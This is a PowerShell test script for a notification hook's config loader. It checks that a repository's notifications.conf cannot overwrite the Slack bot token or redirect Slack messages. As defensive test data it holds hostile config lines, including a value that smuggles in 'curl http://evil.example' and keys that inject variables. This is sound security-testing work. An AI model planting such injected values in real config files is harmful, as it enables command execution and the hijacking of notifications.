# Tests for notify.ps1 config loading (#1309) - the PowerShell twin of
# test-notify-config.sh. A project notifications.conf may set only the four
# NOTIFY_* keys, never SLACK_USER_ID, and no line may name a script variable.
# Plain PowerShell (no Pester). Runs on Windows PowerShell 5.1 or pwsh 7.
# Run with: pwsh -NoProfile -File .maestro/hooks/tests/test-notify-config.ps1

$ErrorActionPreference = 'Stop'

$Notify = Join-Path (Join-Path $PSScriptRoot '..') 'notify.ps1'
if (-not (Test-Path -LiteralPath $Notify)) {
    Write-Output "FAIL: $Notify does not exist"
    exit 1
}

$script:pass = 0
$script:fail = 0

function Assert-Eq($Name, $Actual, $Expected) {
    if ("$Actual" -ceq "$Expected") {
        Write-Output "PASS: $Name"
        $script:pass++
    } else {
        Write-Output "FAIL: $Name - expected '$Expected', got '$Actual'"
        $script:fail++
    }
}

# Copy the hook into an isolated tree so Get-NotifyConfig resolves the
# project conf inside the sandbox, never the real repo's notifications.conf.
function New-Sandbox {
    $root = Join-Path ([System.IO.Path]::GetTempPath()) ("notify-ps1-test-" + [guid]::NewGuid())
    New-Item -ItemType Directory -Force -Path (Join-Path $root '.maestro/hooks') | Out-Null
    New-Item -ItemType Directory -Force -Path (Join-Path $root '.claude') | Out-Null
    New-Item -ItemType Directory -Force -Path (Join-Path $root 'home/.claude') | Out-Null
    Copy-Item -LiteralPath $Notify -Destination (Join-Path $root '.maestro/hooks/notify.ps1')
    return $root
}

function Set-File($Path, [string[]]$Lines) {
    Set-Content -LiteralPath $Path -Value $Lines
}

# Dot-source the sandboxed copy in a child scope, with USERPROFILE pointed at
# the sandbox home, and return the loaded config plus the script variables a
# hostile conf line used to overwrite through Set-Variable.
function Invoke-LoadConfig($Root) {
    $savedProfile = $env:USERPROFILE
    $savedToken = $env:SLACK_BOT_TOKEN
    $env:USERPROFILE = Join-Path $Root 'home'
    $env:SLACK_BOT_TOKEN = 'xoxb-test-token'
    try {
        & {
            . (Join-Path $Root '.maestro/hooks/notify.ps1')
            $loaded = Get-NotifyConfig
            [pscustomobject]@{
                Config          = $loaded
                SlackBotToken   = $SlackBotToken
                LegacySlackFile = $LegacySlackFile
            }
        }
    } finally {
        $env:USERPROFILE = $savedProfile
        $env:SLACK_BOT_TOKEN = $savedToken
    }
}

# Case 1: the four NOTIFY_* keys parse from the project conf; SLACK_USER_ID
# parses (shape-checked) only from the user-global conf.
$root = New-Sandbox
Set-File (Join-Path $root '.maestro/notifications.conf') @(
    'NOTIFY_DESKTOP=false',
    'NOTIFY_SLACK=true',
    'NOTIFY_PERMISSION_PROMPT=false',
    'NOTIFY_IDLE_PROMPT=false'
)
Set-File (Join-Path $root 'home/.claude/notifications.conf') @('SLACK_USER_ID=user.example@U0123-456')
$r = Invoke-LoadConfig $root
Assert-Eq 'parses_notify_desktop' $r.Config.NOTIFY_DESKTOP 'false'
Assert-Eq 'parses_notify_slack' $r.Config.NOTIFY_SLACK 'true'
Assert-Eq 'parses_notify_permission_prompt' $r.Config.NOTIFY_PERMISSION_PROMPT 'false'
Assert-Eq 'parses_notify_idle_prompt' $r.Config.NOTIFY_IDLE_PROMPT 'false'
Assert-Eq 'parses_slack_user_id_from_user_global_conf' $r.Config.SLACK_USER_ID 'user.example@U0123-456'
Remove-Item -LiteralPath $root -Recurse -Force

# Case 2 (#1309): lines that name script variables (PowerShell names are
# case-insensitive, so SLACKBOTTOKEN is $SlackBotToken), bad value shapes,
# quoted values and lowercase keys are ignored; variables and defaults survive.
$root = New-Sandbox
Set-File (Join-Path $root '.maestro/notifications.conf') @(
    '# comment',
    'SLACKBOTTOKEN=xoxb-attacker',
    'LEGACYSLACKFILE=attacker-path',
    'NOTIFY_SLACK=true; curl http://evil.example',
    'NOTIFY_DESKTOP="false"',
    'notify_idle_prompt=false',
    '',
    'SOMEOTHER=x'
)
$r = Invoke-LoadConfig $root
Assert-Eq 'variable_name_key_does_not_overwrite_bot_token' $r.SlackBotToken 'xoxb-test-token'
Assert-Eq 'variable_name_key_does_not_overwrite_paths' $r.LegacySlackFile (Join-Path (Join-Path $root 'home') '.claude/slack_user_id')
Assert-Eq 'malformed_value_ignored_keeps_default' $r.Config.NOTIFY_SLACK 'true'
Assert-Eq 'quoted_value_ignored_keeps_default' $r.Config.NOTIFY_DESKTOP 'true'
Assert-Eq 'lowercase_key_ignored_keeps_default' $r.Config.NOTIFY_IDLE_PROMPT 'true'
Remove-Item -LiteralPath $root -Recurse -Force

# Case 3 (#1309, issue repro): a repo conf that sets SLACK_USER_ID and mutes
# the desktop channel must not redirect Slack. The destination stays the
# user's own ~/.claude/slack_user_id; NOTIFY_DESKTOP=false is a local
# preference and is still honored.
$root = New-Sandbox
Set-File (Join-Path $root '.maestro/notifications.conf') @('SLACK_USER_ID=UATTACKER', 'NOTIFY_DESKTOP=false')
Set-File (Join-Path $root 'home/.claude/slack_user_id') @('U0USERHOME')
$r = Invoke-LoadConfig $root
Assert-Eq 'hostile_project_conf_does_not_redirect_slack' $r.Config.SLACK_USER_ID 'U0USERHOME'
Assert-Eq 'hostile_project_conf_desktop_pref_still_honored' $r.Config.NOTIFY_DESKTOP 'false'
Remove-Item -LiteralPath $root -Recurse -Force

# Case 4 (#1309): with no user-global Slack ID, a repo conf's SLACK_USER_ID
# leaves the destination empty, so Slack never fires.
$root = New-Sandbox
Set-File (Join-Path $root '.maestro/notifications.conf') @('SLACK_USER_ID=UATTACKER', 'NOTIFY_DESKTOP=false')
$r = Invoke-LoadConfig $root
Assert-Eq 'hostile_project_conf_without_user_id_leaves_slack_unset' $r.Config.SLACK_USER_ID ''
Remove-Item -LiteralPath $root -Recurse -Force

# Case 5 (#1309): the legacy project conf (.claude/notifications.conf) is a
# repo file too, so it cannot override the user-global conf's SLACK_USER_ID.
$root = New-Sandbox
Set-File (Join-Path $root '.claude/notifications.conf') @('SLACK_USER_ID=UATTACKER')
Set-File (Join-Path $root 'home/.claude/notifications.conf') @('SLACK_USER_ID=U0USERCONF')
$r = Invoke-LoadConfig $root
Assert-Eq 'legacy_project_conf_does_not_redirect_slack' $r.Config.SLACK_USER_ID 'U0USERCONF'
Remove-Item -LiteralPath $root -Recurse -Force

Write-Output ""
Write-Output "Results: $($script:pass) passed, $($script:fail) failed"
if ($script:fail -ne 0) { exit 1 }
exit 0
